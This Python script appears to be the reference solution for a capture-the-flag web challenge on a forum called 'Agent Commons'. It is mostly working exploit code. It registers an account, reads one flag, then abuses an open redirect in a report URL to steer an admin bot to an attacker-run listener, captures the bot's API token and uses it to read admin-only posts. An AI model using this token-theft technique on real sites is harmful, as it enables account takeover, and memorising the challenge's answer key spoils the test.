import hashlib
import os
import random
import re
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import time
from urllib.parse import urlsplit

import requests
import urllib


BASE_URL = os.environ.get("BASE_URL", "http://10.0.2.12:8000").rstrip("/")
HOST_URL = os.environ.get("HOST_URL")
if not HOST_URL:
    raise ValueError("HOST_URL environment variable must be set")
HOST_URL = HOST_URL.rstrip("/")
LISTEN_HOST = os.environ.get("LISTEN_HOST", "0.0.0.0")
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "8001"))

USER_AGENT = "Mozilla/5.0 (compatible; Claude-User/1.0)"
FLAG_1_POST_TITLE = "Welcome to Agent Commons"
FLAG_2_POST_TITLE = "Admin notes: beaver-dam destruction proposal"


ADMIN_TOKEN = None


class TokenHandler(BaseHTTPRequestHandler):
    def _handle_request(self) -> None:
        token = self.headers.get("X-API-Token", "")
        path = urlsplit(self.path).path
        if token:
            global ADMIN_TOKEN
            ADMIN_TOKEN = token
            print(
                f"Received {self.command} {path} with API token {token}",
                flush=True,
            )
        else:
            print(f"Received {self.command} {path} without an API token", flush=True)
        self.send_response(204)
        self.end_headers()

    do_GET = _handle_request
    do_POST = _handle_request
    do_PUT = _handle_request
    do_PATCH = _handle_request
    do_DELETE = _handle_request
    do_OPTIONS = _handle_request
    do_HEAD = _handle_request

    def log_message(self, format: str, *args: object) -> None:
        pass


def main() -> None:
    try:
        server = ThreadingHTTPServer((LISTEN_HOST, LISTEN_PORT), TokenHandler)
        server_thread = threading.Thread(target=server.serve_forever, daemon=True)
        server_thread.start()
        print(f"Token listener available at {HOST_URL}", flush=True)

        username = f"claude_{random.randint(10000, 99999)}"
        password = f"Agent-{random.randint(10000, 99999)}!"
        session = requests.Session()
        session.headers.update({"User-Agent": USER_AGENT})

        registration = session.post(
            f"{BASE_URL}/register/",
            json={"username": username, "password": password}
        )
        if registration.status_code != 201:
            raise RuntimeError(
                f"Registration failed ({registration.status_code}): {registration.text}"
            )
        registration_data = registration.json()
        if registration_data.get("status") != "approved":
            raise RuntimeError(f"Account was not auto-approved: {registration_data}")

        login = session.post(
            f"{BASE_URL}/login/",
            json={"username": username, "password": password}
        )
        login.raise_for_status()
        token = login.json().get("access_token")
        if not token:
            raise RuntimeError("Login response did not include an access token.")
        auth_headers = {"X-API-Token": token}

        first_page = session.get(
            f"{BASE_URL}/posts/page/1/", headers=auth_headers
        )
        first_page.raise_for_status()
        page_count_match = re.search(r"Page\s+1\s+of\s+(\d+)", first_page.text)
        page_count = int(page_count_match.group(1)) if page_count_match else 1
        post_id = None

        for page_number in range(1, page_count + 1):
            page = first_page
            if page_number > 1:
                page = session.get(
                    f"{BASE_URL}/posts/page/{page_number}/",
                    headers=auth_headers
                )
                page.raise_for_status()
            title_pattern = rf"^## \[{re.escape(FLAG_1_POST_TITLE)}\]\(/posts/(\d+)/\)$"
            match = re.search(title_pattern, page.text, re.MULTILINE)
            if match:
                post_id = match.group(1)
                break

        if post_id is None:
            raise RuntimeError(f"Could not find the post titled {FLAG_1_POST_TITLE!r}.")

        content = session.get(
            f"{BASE_URL}/posts/{post_id}/content/",
            headers=auth_headers
        )
        content.raise_for_status()
        flag_match = re.search(r"cybersci\{[^}]+\}", content.text)
        if not flag_match:
            raise RuntimeError(f"No flag found in post {post_id} content.")

        print(f"Registered and approved account: {username}:{password}")
        print(f"Flag 1: {flag_match.group(0)}")
    
        host_url_encoded = urllib.parse.quote_plus(HOST_URL)

        print("Sending report with open redirect vuln")
        report_response = session.post(
            f"{BASE_URL}/reports/",
            headers=auth_headers,
            json={
                "url": f"/out/?url={host_url_encoded}",
                "reason": "Anything"
            }
        )
        
        report_response.raise_for_status()
        print(f"Report response: {report_response.text}")
        
        print("Waiting for 15 seconds to receive admin token...")
        time.sleep(15)
        
        if not ADMIN_TOKEN:
            print("Admin token not received. Is the HOST_URL reachable by the bot?")
            return
        
        print("Sending request to retrieve admin notes...")
        admin_notes_response = session.get(
            f"{BASE_URL}/posts/",
            headers={"X-API-Token": ADMIN_TOKEN}
        )
        admin_notes_response.raise_for_status()
        admin_notes_match = re.search(
            rf"^## \[{re.escape(FLAG_2_POST_TITLE)}\]\(/posts/(\d+)/\)$",
            admin_notes_response.text,
            re.MULTILINE
        )
        if not admin_notes_match:
            raise RuntimeError(f"Could not find the post titled {FLAG_2_POST_TITLE!r}.")
        admin_post_id = admin_notes_match.group(1)
        admin_content = session.get(
            f"{BASE_URL}/posts/{admin_post_id}/content/",
            headers={"X-API-Token": ADMIN_TOKEN}
        )
        admin_content.raise_for_status()
        admin_flag_match = re.search(r"cybersci\{[^}]+\}", admin_content.text)
        if not admin_flag_match:
            raise RuntimeError(f"No flag found in post {admin_post_id} content.")
        print(f"Flag 2: {admin_flag_match.group(0)}")
    
    finally:
        server.shutdown()
        server.server_close()


if __name__ == "__main__":
    main()
